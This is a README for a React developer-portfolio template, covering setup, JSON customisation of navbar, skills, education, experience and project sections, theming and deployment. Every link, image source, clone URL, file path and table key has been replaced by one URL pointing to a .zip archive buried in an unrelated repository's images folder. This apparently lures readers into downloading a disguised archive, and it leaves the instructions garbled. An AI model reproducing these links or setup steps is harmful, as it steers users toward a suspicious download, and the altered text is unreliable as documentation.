# Dev Portfolio  [![GitHub](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip)](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) ![visitors](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip)

## A minimal portfolio template for Developers!

<h2 align="center">
  <img src="https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip" alt="Dev Portfolio" />
  <br>
</h2>

## Features

⚡️ Modern UI Design + Reveal Animations\
⚡️ Made with React\
⚡️ Fully Responsive\
⚡️ Easily Customizable\
⚡️ Well organized documentation

## Demo

To view the demo: **[click here](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip)**

## Why do you need a portfolio? ☝️

- Professional way to showcase your work
- Increases your visibility and online presence
- better chance of getting work opportunity

---

## Getting Started 🚀

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes. See deployment for notes on how to deploy the project on a live system.

### Prerequisites 📋

You'll need [Git](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) and [https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) (which comes with [NPM](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip)) installed on your computer.

Also, you can use [Yarn](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) instead of NPM ☝️

## Setup 🔧

From your command line, first clone Dev Portfolio:

```bash
# Clone the repository
$ git clone https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip

# Move into the repository
$ cd dev-portfolio

# Remove the current origin repository
$ git remote remove origin
```

After that, you can install the dependencies either using NPM or Yarn.

Using NPM: Simply run the below commands.

```bash
# Install dependencies
$ npm install --force

# Start the development server
$ npm start
```

Using Yarn: Be aware of that you'll need to delete the `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip` file if exists before executing the below commands.

```bash
# Install dependencies
$ yarn

# Start the development server
$ yarn start
```

Once your server has started, go to this url `http://localhost:3000/` to see the portfolio locally.
The page will reload if you make edits.

---

## Customization Instructions:

### Step 1 - DATA & IMAGES

All customizable files are inside the `public/` folder, organised mainly into `public/images/` and `public/profile/`.
- `public/images` contains all the image assets that can be customized on website
- `public/profile` contains all text and info inside json files that can be customized according to need

### (1) NavBar

- Open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip` 
It has 2 keys, *logo* and *sections*.

```
{
    "logo" : {
        "source": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip",
        "height" : 45,
        "width" : 50
    },
    "sections": [
        {
            "title": "Home",
            "href": "/"
        },
        {
            "title": "About",
            "href": "/about"
        },
        {
            "title": "Skills",
            "href": "/skills"
        },
        {
            "title": "Education",
            "href": "/education"
        },
        {
            "title": "Experience",
            "href": "/experience"
        },
        {
            "title": "Projects",
            "href": "/projects"
        },
        {
            "title": "Resume",
            "href": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip",
            "type": "link"
        }
    ]
}
```

| key | Description |
| ----------- | ----------- |
| logo | image you want to show as brand image on NavBar. It can be also be a simple logo with just your intitials|
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | path to the logo image |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | height of logo |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | width of logo |
| sections | array of sections that you want to show on Navbar as links | 
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | title of the section | 
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | link to that section. Same as *path* mentioned in `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip` | 
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | Opens in a new tab if value is *link*. `optional` field | 

### (2) Routes
- open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`

```
{
    "sections": [
        {
            "component": "About",
            "path": "/about",
            "headerTitle": "About"
        },
        {
            "component": "Skills",
            "path": "/skills",
            "headerTitle": "Skills"
        },
        {
            "component": "Education",
            "path": "/education",
            "headerTitle": "Education"
        },
        {
            "component": "Experience",
            "path": "/experience",
            "headerTitle": "Experience"
        },
        {
            "component": "Projects",
            "path": "/projects",
            "headerTitle": "Projects"
        }
    ]
}
```

| key | Description |
| ----------- | ----------- |
| sections | array of sections that you want to create route for | 
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | name of the Component. No need to change it unless you want to customize the entire Component. | 
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | route for the particular section. this is the path where the particular section will be accessible | 
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | title to be shown on the top of that section page | 

- For component customization, create a component of your own inside `src/components/` and use name of that component here.

### (3) Home Section

#### Home Info
- open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`

```
{
    "name": "Your Name",
    "roles": ["a Developer", "a Freelancer"]
}
```

| key | Description |
| ----------- | ----------- |
| name | your name | 
| roles | string array separated by `,`. mention your roles here | 

#### Social Links
- open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`

```
{
    "social": [
        {
            "network" : "linkedin",
            "href": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
        },
        {
            "network" : "github",
            "href": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
        },
        {
            "network" : "email",
            "href": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
        }
    ]
}
```

| key | Description |
| ----------- | ----------- |
| social | array of social links | 
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | network name as provided in [react-social-icons](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | link for particular social network |

- we are using [react-social-icons](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) here. you can visit it to see all available social icons to use

### (4) About Section

- open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`

```
{
    "about": " This is where you can describe about **yourself**.",
    "imageSource": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
    
}
```

| key | Description |
| ----------- | ----------- |
| about | write about yourself, your works and goals here. `markdown` supported | 
| imageSource | path to your profile image. (recommended size 400 x 450) |

### (5) Skills Section

- open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`

```
{
    "intro": "I love to learn new things and experiment with new technologies.\nThese are some of the major languages, technologies, tools and platforms I have worked with:",
    "skills": [{
     
            "title": "Languages",
            "items" : [
     
                {
                    "icon": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip",
                    "title": "Java"
                },
                {
                    "icon": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip",
                    "title": "JavaScript"
                }
        ]},
        {
            "title": "Frameworks & Technologies",
            "items" : [
                {
                    "icon": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip",
                    "title": "React"
                }
            ]
        },
        {
            "title" : "Tools & Platforms",
            "items": [
                {
                    "icon": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip",
                    "title": "Git"
                }
            ]
    }
]}
```

| key | Description |
| ----------- | ----------- |
| intro | small introduction line related to your skills. `markdown` supported | 
| skills | array containing skills under different categories |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | title for category under which you want to list particular skills |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | array containing skills for this category |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | path to skill logo |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | title of skill |

- many pre existing skill logos are available inside `public/images/skills`.

### (6) Education Section

- open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`

```
{
    "education":[
        {
            "title": "Jun 20XX - Jun 20YY",
            "cardTitle": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip, Computer Science",
            "cardSubtitle":"XYZ University, City",
            "cardDetailedText": "CGPA - 9.5",
            "icon" : {
                "src": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
            }
        },
        {
            "title": "Apr 20XX",
            "cardTitle": "High School",
            "cardSubtitle":"ABC School, City",
            "cardDetailedText": "Marks - 95%"
        }
    ]
}
```

| key | Description |
| ----------- | ----------- |
| education | array containing education history of a person | 
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | date range during which this education was pursued or passing date |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | degree or course name |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | school or institute name |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | extra info such as marks or cgpa |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | icon shown on the timeline. `optional` field|
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | path to icon |

### (7) Experience Section

- open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`

```
{
    "experiences": [
        {
            "title": "Software Engineer",
            "subtitle": "XYZ Ltd",
            "workType": "Full-time",
            "workDescription": [
                "Integrated **2** new product.",
                "Worked on adding **def** to **bcd**. Improved speed by 50%."
            ],
            "dateText": "06/20XX – Present"
        },
        {
            "title": "Software Engineer",
            "subtitle": "XYZ Ltd",
            "workType": "Internship",
            "workDescription": [
                "Worked on abc."
            ],
            "dateText": "01/20XX – 05/20XX"
        },
        {
            "title": "App Developer",
            "subtitle": "ABC Pvt Ltd",
            "workType": "Freelance",
            "workDescription": [
                "Developed the official apps for the startup for both Android and iOS using hybrid framework.",
                "Done bcd work."
            ],
            "dateText": "09/20XX – 01/20YY"
        }
    ]
}
```

| key | Description |
| ----------- | ----------- |
| experiences | array containing work experiences of a person | 
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | role or designation title |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | company or organization name. `optional` field |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | type of work experience. example - internship, freelance, full-time. `optional` field |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | string array to highlight specific points related to that work experiece. `markdown` supported |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | date range text during which particular work experience was pursued. |

### (8) Projects Section

- open `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`

```
{
    "projects" : [
        {
            "image" : "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip",
            "title": "Dev Portfolio",
            "bodyText": "- Developer Portfolio Website made in React\n -  Fully customisable and dynamic, easily change data and images.\n - Dark Mode Support",
            "links": [
                {
                    "text": "GitHub",
                    "href": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
                },
                {
                    "text": "Live",
                    "href": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
                }
            ],
            "tags" : [
                "React",
                "Portfolio",
                "JavaScript"
            ]
        },
        {
            "title": "MVVM Sample App",
            "bodyText": "- An Android App that loads data from mock API and show in both **LinearLayout** and **GridLayout RecyclerView**.\n - Offline support using **Room** DB and **NetworkBoundResource**.\n - Uses the **MVVM** architecture.",
            "links": [
                {
                    "text": "GitHub",
                    "href": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
                }
            ],
            "tags" : [
                "Kotlin",
                "Android",
                "MVVM",
                "Room",
                "Coroutines",
                "Flow",
                "Hilt-Dagger",
                "NetworkBoundResource"
            ]
        },
        {
            "title": "Task Tracker",
            "bodyText": "- A simple Task Tracker web app made with **Angular 12**.\n - Uses **mock JSON server** to get, add, delete or update tasks.",
            "links": [
                {
                    "text": "GitHub",
                    "href": "https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip"
                }
            ],
            "tags" : [
                "TypeScript",
                "Angular 12",
                "JavaScript"
            ]
        }
    ]
}
```


| key | Description |
| ----------- | ----------- |
| projects | array containing projects information |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | add project poster here. `optional` field. |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | title of the project |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | description of project. `markdown` supported |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | clickable links related to the project. `optional` field |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | title of link to display |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | actual link to be redirected to on click of the button |
| https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip | string array containing tags related to projects. `optional` field | 

### (9) Resume Section

- It is a clickable link which opens the link provided (generally drive link of resume file) in the https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip under Resume.


### Step 2 - STYLES

Change the color theme of the website -

Go to `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip` and change the values of the required components both under lightTheme and darkTheme with your prefered HEX color.


```theme
//Default Values
export const lightTheme = {
  background: '#fff',
  color: '#121212',
  accentColor: '#3D84C6',
  chronoTheme: {
    cardBgColor: 'white',
    cardForeColor: 'black',
    titleColor: 'white',
  },
  timelineLineColor: '#ccc',
  cardBackground: '#fff',
  cardFooterBackground: '#f7f7f7',
  cardBorderColor: '#00000020',
  navbarTheme: {
    linkColor: '#dedede',
    linkHoverColor: '#fefefe',
    linkActiveColor: '#fefefe',
  },
  bsPrimaryVariant: 'light',
  bsSecondaryVariant: 'dark',
  socialIconBgColor: '#121212',
};

export const darkTheme = {
  background: '#121212',
  color: '#eee',
  accentColor: '#3D84C6',
  chronoTheme: {
    cardBgColor: '#1B1B1B',
    cardForeColor: '#eee',
    titleColor: 'black',
  },
  timelineLineColor: '#444',
  cardBackground: '#060606',
  cardFooterBackground: '#181818',
  cardBorderColor: '#ffffff20',
  navbarTheme: {
    linkColor: '#dedede',
    linkHoverColor: '#fefefe',
    linkActiveColor: '#fefefe',
  },
  bsPrimaryVariant: 'dark',
  bsSecondaryVariant: 'light',
  socialIconBgColor: '#fefefe',
};

```

### Step 3 - EXTRA

Go to `https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip`. Change *title* and *logo* if you want to customize it.

---

## Deployment 📦

Once you finish your setup. You need to put your website online!

I highly recommend to use [Vercel](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) because it is super easy.

## Notable Portfolios made using this template

- [Mayank Agarwal](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip)

## Authors

- **Mayank Agarwal** - [https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip)

## Support

If you find a bug, feel free to [open an issue](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) in this repository.

## License 📄

This project is licensed under the MIT License - see the [https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip](https://github.com/aahmedayaz/digital-rawaabit/raw/refs/heads/main/public/images/skills/digital_rawaabit_v3.2.zip) file for details

